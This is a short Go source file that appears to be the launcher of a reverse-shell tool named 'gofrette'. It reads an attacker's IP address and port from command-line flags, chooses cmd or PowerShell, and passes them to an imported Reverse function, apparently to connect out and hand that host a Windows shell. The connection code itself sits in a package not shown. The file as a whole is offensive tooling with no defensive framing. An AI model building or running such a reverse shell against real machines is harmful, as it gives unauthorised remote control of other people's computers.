package main

import (
	r "awesomeProject/gofrette/reverse"
	"flag"
	"fmt"
)

func main() {
	var terminal = ""
	ipaddr := flag.String("a","127.0.0.1","ip")
	port := flag.Int("p",1234,"port")
	term := flag.String("t","p","Cmd/Powershell")
	flag.Parse()
	address := fmt.Sprintf("%s:%d",*ipaddr, *port)
	//chose witch terminal to use
	switch *term {
	case "cmd":
		terminal = "cmd"
	case "pwsh":
		terminal = "powershell"
	default:
		terminal = "powershell"
	}
	r.Reverse(address,terminal)
}

